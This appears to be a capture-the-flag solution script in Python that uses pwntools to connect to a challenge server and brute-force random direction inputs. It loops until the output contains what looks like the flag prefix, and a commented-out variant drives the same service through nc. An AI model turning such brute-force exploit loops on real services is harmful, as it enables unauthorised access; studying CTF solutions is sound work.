from subprocess import Popen, PIPE
import sys
import random
import pwn

pwn.context.log_level = 'error'

for round in range(65536):

    conn = pwn.remote('challenges.crysys.hu', 5007)
    line = conn.recvuntil('Choice: ')
    conn.sendline(b'1\n')
    line = conn.recvuntil('Give me an index: ')
    conn.sendline(b'46\n')
    line = conn.recvuntil('Give me an index: ')
    conn.sendline(b'a\n')
    print(f'round {round} ', end='')

    data = []
    for i in range(8):
        data.append(random.choice(['h','j','k','l']))

    #hkkljhjl  'main' panicked at '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    # data= list("hlhljk")
    data = data + ['l'] * (32 - len(data))
    # print(data)
    tip = (''.join(data[0:8]))
    print(f'data {tip} ', end='')

    for i in range(len(data)):
        line = conn.recvuntil(f'Give me the {i}. direction: ')
        # print(line)
        conn.sendline(data[i])

    line = conn.recvuntil('Choice:')
    # print(line)
    conn.sendline(b'2\n')
    line = conn.recvall(20)

    print(line)
    if b'cd21' in line: #n line: 
        break

# #i = sys.argv[1]
# i = 46;

# round = 0
# # while True:
#     # if round % 10 == 0:
# print(f'\rround {round}', end='')
# # round += 1
# # l = str(i).encode('ascii')
# # step1 = random.choice([b"h",b"j",b"k",b"l"])
# # step2 = random.choice([b"h",b"j",b"k",b"l"])
# # path = step1 + b"\n"+ step2 + b"\n"
# # path = b""
# # inp = b"1\n" + l + b"\na\n" + path+ (b'l\n'*30) + b'2\n'

# # print (inp)
# process = Popen(["nc", "challenges.crysys.hu", "5007"], stdin=PIPE, stdout=PIPE, stderr=PIPE)
# (output, err) = process.communicate()
# print(output)
# # (output, err) = process.communicate(b'1\n')
# # print(output)

# exit_code = process.wait()

#     # if True or b'cd21' in output or b'cd21' in err or (b"WRONG" not in output):
#     #     print('')
#     #     print(output)
#     #     print(err)

#     # if b'cd21' in output or b'cd21' in err:
#     #     break
#     # break
